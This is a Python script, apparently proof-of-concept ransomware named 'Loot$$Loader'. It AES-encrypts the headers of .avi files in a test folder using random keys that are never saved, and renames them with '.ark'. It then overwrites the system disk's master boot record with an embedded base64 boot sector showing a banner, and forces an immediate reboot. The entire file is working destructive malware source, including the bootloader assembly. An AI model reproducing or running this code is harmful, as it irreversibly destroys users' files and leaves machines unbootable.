#!/usr/bin/python3 

import mmap
import os
import glob
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import base64
import platform


class AESCipher(object):
    def __init__(self, key):
        self.block_size = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, plain_text):
        plain_text = self.__pad(plain_text)
        iv = Random.new().read(self.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted_text = cipher.encrypt(plain_text.encode())
        return b64encode(iv + encrypted_text).decode("ISO-8859-1")

    def decrypt(self, encrypted_text):
        encrypted_text = b64decode(encrypted_text)
        iv = encrypted_text[:self.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        plain_text = cipher.decrypt(encrypted_text[self.block_size:]).decode("ISO-8859-1")
        return self.__unpad(plain_text)

    def __pad(self, plain_text):
        number_of_bytes_to_pad = self.block_size - len(plain_text) % self.block_size
        ascii_string = chr(number_of_bytes_to_pad)
        padding_str = number_of_bytes_to_pad * ascii_string
        padded_plain_text = plain_text + padding_str
        return padded_plain_text

    @staticmethod
    def __unpad(plain_text):
        last_character = plain_text[len(plain_text) - 1:]
        return plain_text[:-ord(last_character)]


class bloader():
    def __init__(self, disk):

        ## The Loot$$Loader MBR easy asm code 8086 plateforme
        ##
        ##
        # bits 16
        # org 0x7C00
        # 
        # ;set background
        # mov ah, 0x06
        # xor al, al
        # xor cx, cx
        # mov dx, 0x184f
        # mov bh, 0x9b
        # int 0x10
        # 
        # mov si, msg
        # call _print
        # JMP $
        # 
        # _print:
        #   mov ah, 0x0e
        #   mov bl, 0x9b
        #   mov bh, 0x00
        #   int 0x10
        # 
        # _get_char:
        #   mov al, [si]
        #   inc si
        #   or al, al
        #   jz _exit
        #   call _print
        #   jmp _get_char
        #   ret
        # 
        # _exit:
        #   ret
        # 
        # msg: db "          .-~~~-.",13,10,"  .- ~ ~-(       )_ _",13,10," /                    ~ -.",13,10,"|   Ark Systemes          ',",13,10," \          Loot$$Loader     .'",13,10,"   ~- ._ ,. ,.,.,., ,.. -~",13,10,"           '       '",13,10," ",13,10,"The one who holds the key, holds the power..."
        # 
        # times 510 - ($ - $$) db 0
        # dw 0xAA55
        #
        ## This code is assembled with nasm
        ## nasm lootloader.S -f bin -o lootloader.bin
        ##
        ## The lootloader.bin is then encoded in base64 `self.lootloader`
        ## 

        self.lootloader = ("tAYwwDHJuk8Yt5vNEL4rfOgCAOv+tA6zm7cAzRCKBEYIwHQG6O7/6/TDwyAgICAgICAgICAuLX5+"
                           "fi0uDQogIC4tIH4gfi0oICAgICAgIClfIF8NCiAvICAgICAgICAgICAgICAgICAgICB+IC0uDQp8"
                           "ICAgQXJrIFN5c3RlbWVzICAgICAgICAgICcsDQogXCAgICAgICAgICBMb290JCRMb2FkZXIgICAg"
                           "IC4nDQogICB+LSAuXyAsLiAsLiwuLC4sICwuLiAtfg0KICAgICAgICAgICAnICAgICAgICcNCiAN"
                           "CkNoYXJnZW1lbnQgZHUgbm95YXV4IGVuIGNvdXJzLi4uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVao=")

        self.disk = disk

    def bl_read(self):
        with open(self.disk, 'r+b') as d:
            loader = d.read(512)
        with open('./your_original_win_bloader.bin', 'wb') as f:
            f.write(loader)
        return 0

    def bl_write(self):
        loader = base64.b64decode(self.lootloader)
        print(loader)

        with open(self.disk, 'r+b') as d:
            d.write(loader)
        return 0


def encryptfiles():
    ## File Encryption
    all_files = [x for x in glob.iglob('./files/test/*.avi', recursive=True)]
    print('nbr of files to encrypt: %s' % (len(all_files)))

    for file_to_encrypt in all_files:
        if not os.path.isdir(file_to_encrypt) and not os.stat(file_to_encrypt).st_size == 0:
            with open(file_to_encrypt, "r+") as f:
                    mm = mmap.mmap(f.fileno(), 0)
                    if len(mm[:128]) == 128:
                        bytes_to_encrypt = mm[:512]

                        base64_bytes = base64.b64encode(bytes_to_encrypt)
                        bytes_to_encrypt = base64_bytes
                        #print(bytes_to_encrypt)

                        key = get_random_bytes(32)
                        enc = AESCipher(key)
                        repl_string = bytes(enc.encrypt(bytes_to_encrypt.decode()), encoding='ISO-8859-1')
                        len_repl_string = len(repl_string)
                        #print(repl_string)
                        
                        #print(len_repl_string)
                        mm[:len_repl_string+1] = repl_string + bytes('\n', encoding='ISO-8859-1')
                        mm.seek(0)
                        mm.close()

    for file_to_encrypt in all_files:
        os.rename(file_to_encrypt, file_to_encrypt+'.ark')
        print('[*] Encrypted => %s' % (file_to_encrypt))

def dr_mbr(phy_drive):
    # Dump and Rewrite the MBR
    print('[!] Dump Original MBR')
    read_mbr = bloader(phy_drive)
    if read_mbr.bl_read() == 0:
        print('[+] Original MBR dumped into "your_original_win_bloader.bin"')

    print('[!] Write Loot$$Loader MBR')
    read_mbr = bloader(phy_drive)
    if read_mbr.bl_write() == 0:
        print('[+] Loot$$Loader Successfully writed as new MBR !!')

def restart():
    os.system('shutdown -r -t 0')

if __name__ == '__main__':
    pf = platform.system()
    if pf == 'Linux':
        phy_drive = '/dev/sda'
    if pf == 'Windows':
        phy_drive = r"\\.\PhysicalDrive0"
    encryptfiles()
    dr_mbr(phy_drive)
    restart()
